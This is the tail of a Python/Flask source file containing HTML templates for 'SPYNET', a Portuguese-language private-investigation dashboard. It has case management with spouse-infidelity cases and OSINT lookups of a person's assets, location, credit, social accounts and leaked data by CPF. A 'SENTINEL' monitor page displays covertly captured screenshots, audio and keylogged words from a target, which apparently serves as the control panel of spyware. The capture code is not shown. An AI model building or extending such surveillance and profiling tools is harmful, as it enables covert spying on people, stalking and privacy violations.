        h1{color:#00ffcc;font-size:28px;letter-spacing:6px;text-shadow:0 0 10px #00ffcc;margin-bottom:5px}
        .sub{font-size:10px;color:#8899aa;letter-spacing:3px;margin-bottom:30px;border-top:1px solid rgba(0,255,204,0.3);padding-top:15px}
        input{width:100%;padding:14px;margin:12px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#00ffcc;font-family:monospace;font-size:16px;text-align:center;letter-spacing:2px}
        input:focus{outline:none;border-color:#00ffcc;box-shadow:0 0 15px rgba(0,255,204,0.3)}
        button{width:100%;padding:14px;background:linear-gradient(90deg,#00ffcc,#00ccff);border:none;border-radius:4px;font-family:monospace;font-weight:bold;font-size:16px;letter-spacing:3px;cursor:pointer;transition:all .3s;color:#0a0e1a;margin-top:10px}
        button:hover{background:#00ffcc;box-shadow:0 0 20px #00ffcc;transform:scale(1.01)}
        .erro{color:#ff2244;margin-top:15px;font-size:12px;letter-spacing:1px}
        .badge{position:absolute;bottom:15px;right:20px;font-size:9px;color:#334455;font-family:monospace}
        .scan-line{position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,transparent,#00ffcc,transparent);animation:scan 4s linear infinite}
        @keyframes scan{0%{top:0}100%{top:100%}}
    </style>
</head>
<body>
<div class="scan-line"></div>
<div class="card">
    <div class="logo">🕵️</div>
    <h1>SPYNET</h1>
    <div class="sub">• SISTEMA DE INTELIGÊNCIA •</div>
    <form method="POST">
        <input type="password" name="senha" placeholder="••••••••" autofocus required>
        <button type="submit">🔐 AUTORIZAR ACESSO</button>
        {% if erro %}<div class="erro">⚠️ {{ erro }}</div>{% endif %}
    </form>
</div>
<div class="badge">CLASSIFICAÇÃO: SIGILOSO • SPYNET SECURITY</div>
</body>
</html>
'''

PAINEL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SPYNET — PAINEL DE COMANDO</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0e1a;font-family:'Share Tech Mono',monospace;color:#e8edf5;padding:20px}
        .navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;border-radius:4px 4px 0 0;box-shadow:0 0 20px rgba(0,255,204,0.1)}
        .logo{font-size:28px;font-weight:bold;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
        .logo span{color:#0088ff;font-size:12px;letter-spacing:2px}
        .btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;cursor:pointer;text-decoration:none;color:#00ffcc;font-family:monospace;font-size:12px;font-weight:bold;transition:all .3s;display:inline-block;margin:0 3px}
        .btn:hover{background:#00ffcc;color:#0a0e1a;box-shadow:0 0 10px #00ffcc;transform:scale(1.02)}
        .btn-red{background:#ff2244;border-color:#ff2244;color:#fff}
        .btn-red:hover{background:#ff2244;box-shadow:0 0 10px #ff2244}
        .btn-osint{background:#aa44ff;border-color:#aa44ff;color:#fff}
        .stats{display:flex;gap:20px;margin-bottom:25px}
        .stat-card{background:rgba(0,20,40,0.6);border:1px solid #00ffcc;border-radius:4px;padding:20px;flex:1;text-align:center;transition:all .3s}
        .stat-card:hover{border-color:#00ffcc;box-shadow:0 0 15px rgba(0,255,204,0.2);transform:translateY(-2px)}
        .stat-number{font-size:36px;font-weight:bold;color:#00ffcc;font-family:monospace}
        .stat-label{font-size:11px;color:#8899aa;letter-spacing:2px;margin-top:5px}
        .caso-card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:4px;padding:15px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;transition:all .3s}
        .caso-card:hover{border-color:#00ffcc;background:rgba(0,136,255,0.05);transform:translateX(5px)}
        .caso-id{font-family:monospace;font-size:11px;color:#00ffcc;background:#0a0e1a;padding:4px 8px;border-radius:2px}
        .btn-pequeno{background:transparent;border:1px solid #00ffcc;padding:5px 12px;border-radius:3px;text-decoration:none;color:#00ffcc;font-size:11px;margin:0 3px;transition:all .3s}
        .btn-pequeno:hover{background:#00ffcc;color:#0a0e1a}
        .btn-pdf{border-color:#00cc66;color:#00cc66}
        .btn-pdf:hover{background:#00cc66;color:#0a0e1a}
        h3{font-size:14px;letter-spacing:2px;margin-bottom:15px;color:#00ffcc;border-left:3px solid #00ffcc;padding-left:12px}
    </style>
</head>
<body>
<div class="navbar">
    <div class="logo">🕵️ SPYNET <span>INTEL</span></div>
    <div>
        <a href="/osint/pesquisar" class="btn btn-osint">🔎 OSINT</a>
        <a href="/sentinel" class="btn">🛡️ MONITOR</a>
        <a href="/novo_caso" class="btn">➕ NOVO CASO</a>
        <button class="btn btn-red" onclick="limparTodosCasos()">🗑️ LIMPAR</button>
        <a href="/logout" class="btn btn-red">🚪 SAIR</a>
    </div>
</div>

<div class="stats">
    <div class="stat-card"><div class="stat-number">{{ total }}</div><div class="stat-label">TOTAL CASOS</div></div>
    <div class="stat-card"><div class="stat-number">{{ ativos }}</div><div class="stat-label">EM ANDAMENTO</div></div>
    <div class="stat-card"><div class="stat-number">{{ concl }}</div><div class="stat-label">CONCLUÍDOS</div></div>
</div>

<h3>📁 CASOS INVESTIGATIVOS</h3>
<div id="casos-list">
{% for caso in casos %}
<div class="caso-card">
    <div><span class="caso-id">{{ caso.id }}</span><br><strong>{{ caso.investigado }}</strong><br><small>{{ caso.status }}</small></div>
    <div>
        <a href="/caso/{{ caso.id }}" class="btn-pequeno">👁️ VER</a>
        <a href="/relatorio/{{ caso.id }}.pdf" class="btn-pequeno btn-pdf">📄 PDF</a>
    </div>
</div>
{% else %}
<div style="text-align:center;padding:40px;color:#8899aa">NENHUM CASO REGISTRADO.<br><a href="/novo_caso" style="color:#00ffcc">CRIAR PRIMEIRO CASO →</a></div>
{% endfor %}
</div>

<script>
function limparTodosCasos() {
    if(confirm('⚠️ ATENÇÃO INVESTIGADOR! Esta ação irá REMOVER TODOS OS CASOS permanentemente. Confirmar?')) {
        fetch('/api/limpar_casos', {method:'POST'})
            .then(r => r.json())
            .then(d => { if(d.ok) location.reload(); });
    }
}
</script>
</body>
</html>
'''

NOVO_CASO_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — NOVO CASO</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:'Share Tech Mono',monospace;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px}
.logo{font-size:28px;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc;font-size:12px}
.btn:hover{background:#00ffcc;color:#0a0e1a}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:4px;padding:30px;max-width:700px;margin:0 auto}
h2{color:#00ffcc;margin-bottom:20px;font-size:18px;letter-spacing:2px}
input,select,textarea{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#00ffcc;font-family:monospace}
input:focus,select:focus,textarea:focus{outline:none;border-color:#00ffcc;box-shadow:0 0 10px rgba(0,255,204,0.3)}
button{background:#00ffcc;border:none;padding:14px;border-radius:4px;font-family:monospace;font-weight:bold;cursor:pointer;width:100%;color:#0a0e1a;font-size:14px;transition:all .3s}
button:hover{background:#00ffcc;box-shadow:0 0 15px #00ffcc;transform:scale(1.01)}
</style>
</head>
<body>
<div class="navbar"><div class="logo">🕵️ SPYNET</div><a href="/painel" class="btn">← PAINEL</a></div>
<div class="card"><h2>➕ ABRIR NOVO CASO</h2>
<form method="POST">
<select name="tipo" required><option value="">TIPO DE CASO...</option><option>Investigação de pessoa física</option><option>Investigação de pessoa jurídica</option><option>Localização patrimonial</option><option>Análise de crédito</option><option>Infidelidade conjugal</option><option>Due Diligence empresarial</option></select>
<input type="text" name="cliente" placeholder="CLIENTE (CONTRATANTE)" required>
<input type="text" name="investigado" placeholder="INVESTIGADO / ALVO" required>
<textarea name="objetivo" rows="3" placeholder="OBJETIVO DA INVESTIGAÇÃO" required></textarea>
<textarea name="notas" rows="3" placeholder="NOTAS INICIAIS (OPCIONAL)"></textarea>
<button type="submit">🔍 INICIAR INVESTIGAÇÃO</button>
</form>
</div>
</body>
</html>
'''

CASO_DETALHE_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — {{ caso.id }}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:'Share Tech Mono',monospace;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px}
.logo{font-size:28px;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc;font-size:12px}
.btn:hover{background:#00ffcc;color:#0a0e1a}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:4px;padding:25px;margin-bottom:20px}
.status{display:inline-block;padding:5px 12px;border-radius:3px;font-size:11px}
.status-andamento{background:#ffaa00;color:#0a0e1a}
.status-concluido{background:#00cc66;color:#0a0e1a}
.etapa-card{background:rgba(0,0,0,0.3);border-left:3px solid #00ffcc;padding:15px;margin-bottom:10px;transition:all .3s}
.etapa-card:hover{transform:translateX(5px)}
input,textarea,select{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#00ffcc;font-family:monospace}
button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight:bold;cursor:pointer;color:#0a0e1a;transition:all .3s}
button:hover{box-shadow:0 0 15px #00ffcc;transform:scale(1.01)}
.badge{display:inline-block;background:rgba(0,136,255,0.3);padding:3px 8px;border-radius:2px;font-size:10px}
</style>
</head>
<body>
<div class="navbar"><div class="logo">🕵️ SPYNET</div><a href="/painel" class="btn">← PAINEL</a></div>
<div class="card"><h2>{{ caso.investigado }}</h2><p><span class="badge">{{ caso.id }}</span> • {{ caso.criado_em }}</p><p><strong>CLIENTE:</strong> {{ caso.cliente }}</p><p><strong>TIPO:</strong> {{ caso.tipo }}</p><p><strong>STATUS:</strong> <span class="status status-{{ 'andamento' if caso.status == 'Em andamento' else 'concluido' }}">{{ caso.status }}</span></p><p><strong>OBJETIVO:</strong> {{ caso.objetivo }}</p>{% if caso.notas %}<p><strong>NOTAS:</strong> {{ caso.notas }}</p>{% endif %}</div>
<div class="card"><h3>📋 ETAPAS DA INVESTIGAÇÃO</h3>{% for e in caso.etapas %}<div class="etapa-card"><strong>ETAPA {{ e.num }}: {{ e.titulo }}</strong><div><span class="badge">{{ e.tipo }}</span> • {{ e.ts }}</div><p style="margin-top:10px;white-space:pre-line">{{ e.dados }}</p></div>{% else %}<p>NENHUMA ETAPA REGISTRADA.</p>{% endfor %}</div>
<div class="card"><h3>➕ ADICIONAR ETAPA</h3><input type="text" id="titulo" placeholder="TÍTULO DA ETAPA"><select id="tipo"><option>Identificação Cadastral</option><option>Análise Digital (OSINT)</option><option>Estrutura Patrimonial</option><option>Vínculos e Relacionamentos</option><option>Conclusão Investigativa</option><option>Busca em Redes Sociais</option></select><textarea id="dados" rows="5" placeholder="DADOS E ANÁLISE..."></textarea><button onclick="adicionarEtapa()">➕ SALVAR ETAPA</button></div>
<script>
const CASO_ID = "{{ caso.id }}";
async function adicionarEtapa() {
    const titulo = document.getElementById('titulo').value;
    const tipo = document.getElementById('tipo').value;
    const dados = document.getElementById('dados').value;
    if(!titulo || !dados) { alert('PREENCHE TÍTULO E DADOS'); return; }
    const res = await fetch(`/api/caso/${CASO_ID}/etapa`, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({titulo, tipo, dados})});
    if((await res.json()).ok) location.reload();
}
</script>
</body>
</html>
'''

OSINT_BR_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — OSINT TOOLS</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:'Share Tech Mono',monospace;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px}
.logo{font-size:28px;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc;font-size:12px}
.btn:hover{background:#00ffcc;color:#0a0e1a}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(450px,1fr));gap:20px}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:4px;padding:25px}
.card h2{color:#00ffcc;margin-bottom:15px;font-size:16px;letter-spacing:2px;border-left:3px solid #00ffcc;padding-left:12px}
input{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#00ffcc;font-family:monospace}
input:focus{outline:none;border-color:#00ffcc;box-shadow:0 0 10px rgba(0,255,204,0.3)}
button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-family:monospace;font-weight:bold;cursor:pointer;width:100%;color:#0a0e1a;margin-top:10px;transition:all .3s}
button:hover{box-shadow:0 0 15px #00ffcc;transform:scale(1.01)}
.resultado-card{background:rgba(0,0,0,0.3);border-left:2px solid #00ffcc;padding:12px;margin-bottom:8px}
.resultado-card a{color:#00ffcc;text-decoration:none;font-size:11px}
.resultado-card a:hover{text-decoration:underline}
.categoria-titulo{color:#ffaa44;margin:15px 0 8px 0;font-size:12px;letter-spacing:2px}
</style>
</head>
<body>
<div class="navbar"><div class="logo">🕵️ SPYNET OSINT</div><div><a href="/painel" class="btn">← PAINEL</a></div></div>
<div class="grid">
<div class="card"><h2>🏠 BENS E PATRIMÔNIO</h2><input type="text" id="bens_cpf" placeholder="CPF ou CNPJ"><button onclick="buscarBens()">🔍 BUSCAR BENS</button><div id="bens_resultados"></div></div>
<div class="card"><h2>📍 LOCALIZAR PESSOA</h2><input type="text" id="local_cpf" placeholder="CPF"><input type="text" id="local_nome" placeholder="Nome completo"><button onclick="buscarLocalizacao()">📍 LOCALIZAR</button><div id="local_resultados"></div></div>
<div class="card"><h2>📊 ANÁLISE DE CRÉDITO</h2><input type="text" id="credito_cpf" placeholder="CPF"><button onclick="buscarCredito()">📊 ANALISAR</button><div id="credito_resultados"></div></div>
<div class="card"><h2>🌐 REDES SOCIAIS</h2><input type="text" id="rede_nome" placeholder="Nome completo"><input type="text" id="rede_username" placeholder="Username"><button onclick="buscarRedes()">🔍 BUSCAR</button><div id="rede_resultados"></div></div>
<div class="card"><h2>🔓 DADOS VAZADOS</h2><input type="email" id="vazado_email" placeholder="Email"><button onclick="buscarVazados()">🔍 VERIFICAR</button><div id="vazado_resultados"></div></div>
</div>
<script>
async function buscarBens(){const c=document.getElementById('bens_cpf').value;if(!c){alert('Digite CPF ou CNPJ');return;}const r=await fetch('/osint/bens',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf_cnpj:c})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('bens_resultados').innerHTML=h;}
async function buscarLocalizacao(){const c=document.getElementById('local_cpf').value;const n=document.getElementById('local_nome').value;if(!c&&!n){alert('Digite CPF ou Nome');return;}const r=await fetch('/osint/localizacao',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf:c,nome:n})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('local_resultados').innerHTML=h;}
async function buscarCredito(){const c=document.getElementById('credito_cpf').value;if(!c){alert('Digite CPF');return;}const r=await fetch('/osint/credito',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf:c})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('credito_resultados').innerHTML=h;}
async function buscarRedes(){const n=document.getElementById('rede_nome').value;const u=document.getElementById('rede_username').value;if(!n&&!u){alert('Digite nome ou username');return;}const r=await fetch('/osint/redes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nome:n,username:u})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('rede_resultados').innerHTML=h;}
async function buscarVazados(){const e=document.getElementById('vazado_email').value;if(!e){alert('Digite email');return;}const r=await fetch('/osint/vazamentos',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('vazado_resultados').innerHTML=h;}
</script>
</body>
</html>
'''

SENTINEL_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — SENTINEL MONITOR</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:'Share Tech Mono',monospace;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px}
.logo{font-size:28px;letter-spacing:4px;color:#00ffcc;text-shadow:0 0 8px #00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc;font-size:12px;margin:0 3px;display:inline-block}
.btn-stop{background:#ff2244;border-color:#ff2244;color:#fff}
.btn-start{background:#00cc66;border-color:#00cc66;color:#fff}
.btn-clear{background:#ffaa44;border-color:#ffaa44;color:#0a0e1a}
.status-indicator{display:inline-flex;align-items:center;gap:8px;background:rgba(0,0,0,0.5);padding:5px 15px;border-radius:4px}
.led{width:10px;height:10px;border-radius:50%;background:#0f0;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
.grid{display:flex;gap:20px;flex-wrap:wrap}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:4px;padding:20px;flex:1;min-width:300px}
.card-header{border-bottom:1px solid #00ffcc;margin-bottom:15px;padding-bottom:10px;color:#00ffcc}
img{width:100%;border-radius:4px;max-height:200px;object-fit:contain;background:#000}
audio{width:100%}
.stats{display:flex;gap:15px;flex-wrap:wrap}
.stat-box{text-align:center;background:rgba(0,0,0,0.3);padding:15px;border-radius:4px;flex:1}
.stat-number{font-size:28px;font-weight:bold;color:#00ffcc}
.keylog-area{background:rgba(0,0,0,0.5);border-radius:4px;padding:15px;height:300px;overflow-y:auto;font-family:monospace;font-size:12px}
.keylog-line{padding:5px;border-bottom:1px solid #1a2a3a}
</style>
</head>
<body>
<div class="navbar"><div class="logo">🕵️ SENTINEL</div><div><div class="status-indicator"><div class="led"></div><span id="statusText">CARREGANDO...</span></div><button class="btn-start btn" onclick="iniciar()">▶️ INICIAR</button><button class="btn-stop btn" onclick="parar()">⏸️ PARAR</button><button class="btn-clear btn" onclick="limparDados()">🗑️ LIMPAR</button><a href="/painel" class="btn">← PAINEL</a></div></div>
<div class="grid"><div class="card"><div class="card-header">📸 ÚLTIMA CAPTURA</div><img id="screenshot" onclick="abrirModal()"><div id="scr_time" style="font-size:11px;color:#8899aa;margin-top:8px"></div></div>
<div class="card"><div class="card-header">🎤 ÚLTIMO ÁUDIO</div><audio id="audio" controls></audio><div id="aud_time" style="font-size:11px;color:#8899aa;margin-top:8px"></div></div>
<div class="card"><div class="card-header">📊 ESTATÍSTICAS</div><div class="stats"><div class="stat-box"><div class="stat-number" id="scr_count">0</div><div>SCREENS</div></div><div class="stat-box"><div class="stat-number" id="aud_count">0</div><div>ÁUDIOS</div></div><div class="stat-box"><div class="stat-number" id="key_count">0</div><div>TECLAS</div></div></div></div></div>
<div class="card"><div class="card-header">⌨️ PALAVRAS CAPTURADAS</div><div class="keylog-area" id="keylog"></div></div>
<div id="modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center" onclick="fecharModal()"><span style="position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer;color:#fff">&times;</span><img id="modal-img" style="max-width:90%;max-height:90%"></div>
<script>
function atualizarStatus(){fetch('/api/sentinel/status').then(r=>r.json()).then(d=>{document.getElementById('statusText').innerText=d.ativo?"🟢 MONITORANDO":"🔴 PARADO";});}
function atualizar(){document.getElementById('screenshot').src='/api/sentinel/screenshot/latest?'+Date.now();document.getElementById('scr_time').innerHTML='📸 '+new Date().toLocaleTimeString();let a=document.getElementById('audio');a.src='/api/sentinel/audio/latest?'+Date.now();a.load();document.getElementById('aud_time').innerHTML='🎤 '+new Date().toLocaleTimeString();fetch('/api/sentinel/keylog').then(r=>r.json()).then(d=>{let div=document.getElementById('keylog');if(d.teclas&&d.teclas.length){div.innerHTML=d.teclas.map(l=>`<div class="keylog-line">💬 ${escapeHtml(l)}</div>`).join('');}else{div.innerHTML='<div class="keylog-line">NENHUMA PALAVRA CAPTURADA...</div>';}});fetch('/api/sentinel/status').then(r=>r.json()).then(d=>{if(d.stats){document.getElementById('scr_count').innerText=d.stats?.screenshots||0;document.getElementById('aud_count').innerText=d.stats?.audios||0;document.getElementById('key_count').innerText=d.stats?.teclas||0;}});}
function iniciar(){fetch('/api/sentinel/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:true})}).then(()=>{atualizarStatus();atualizar();});}
function parar(){fetch('/api/sentinel/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:false})}).then(()=>{atualizarStatus();atualizar();});}
function limparDados(){if(confirm('⚠️ LIMPAR TODOS OS DADOS?')){fetch('/api/sentinel/clear',{method:'POST'}).then(()=>{atualizar();});}}
function escapeHtml(t){let d=document.createElement('div');d.textContent=t;return d.innerHTML;}
function abrirModal(){let i=document.getElementById('screenshot').src;if(i){document.getElementById('modal-img').src=i;document.getElementById('modal').style.display='flex';}}
function fecharModal(){document.getElementById('modal').style.display='none';}
setInterval(atualizar,3000);atualizar();atualizarStatus();
</script>
</body>
</html>
'''

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    criar_chave_mestra()
    
    print("=" * 60)
    print("🕵️ SPYNET OSINT ULTIMATE — SISTEMA ESTILO FBI")
    print("=" * 60)
    print(f"🔐 Senha do sistema: {SISTEMA_SENHA}")
    print(f"🔑 Chave mestra: {CHAVE_MESTRA}")
    print("=" * 60)
    print("📱 Acesse: http://localhost:5000")
    print("=" * 60)
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)